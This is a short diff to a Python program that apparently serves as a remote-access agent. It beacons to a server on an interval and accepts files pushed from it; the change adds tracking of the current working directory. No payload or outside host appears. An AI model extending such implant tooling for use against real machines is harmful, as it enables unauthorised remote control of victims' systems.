@@ -4,7 +4,7 @@ import platform, ssl, subprocess
 from printlib import *
 from importlib import util
 from time import time, sleep
-from os import remove, path, getpid, kill, getlogin, name
+from os import remove, path, getpid, kill, getlogin, name, chdir, getcwd
 from datetime import datetime
 from sys import exit,exc_info
 from signal import SIGTERM
@@ -24,7 +24,7 @@ BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = BEACON_INTERVAL_DEFAULT
 BEACON_INTERVAL_HDD = None
 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
-
+CURRENT_WORKING_DIR = getcwd()
 
 try:
     if name  == "nt":
@@ -212,6 +212,12 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
         if VERBOSE:
             print_fail("IO Error - Unable to Write File from Server")
             send_data(conn, "INVALID DESTINATION PATH")
+
+def get_cwd():
+    global CURRENT_WORKING_DIR
+    CURRENT_WORKING_DIR = getcwd()
+    if VERBOSE:
+        print_info("PWD: {}".format(CURRENT_WORKING_DIR))
 
 def beacon(conn, data):
     global BEACON_INTERVAL_SETTING
